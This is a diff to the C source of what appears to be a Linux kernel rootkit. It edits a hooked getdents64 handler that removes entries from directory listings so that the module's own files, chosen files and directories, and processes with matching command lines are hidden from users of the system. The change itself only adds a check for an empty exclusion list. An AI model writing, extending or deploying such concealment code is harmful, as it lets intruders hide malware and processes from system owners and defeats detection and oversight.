@@ -56,13 +56,16 @@ long hook_getdents64_impl(unsigned int fd, char __user *dirp, long ret) {
         size_t shift_by = 0;
 
 #ifdef HIDE_MODULE
+        // check regardless of the exclusions - finish the loop
         if (is_mod_directory(fd) && strstr(d->d_name, MODULE_NAME)) { // if modules directory and HIDE_MODULE is set - hide the mod files
             shift_by = d->d_reclen;
             goto shift_and_iter;
         }
 #endif
 
-        if (str_entry_is_excluded(d->d_name)) { // hide dirs/files by custom filtering
+        if (string_exclusions_are_empty()) {
+            // do nothing
+        } else if (str_entry_is_excluded(d->d_name)) { // hide dirs/files by custom filtering
             shift_by = d->d_reclen;
             goto shift_and_iter;
         } else if (is_numeric(d->d_name)) { // hide processes that contain the excluded string in the cmdline
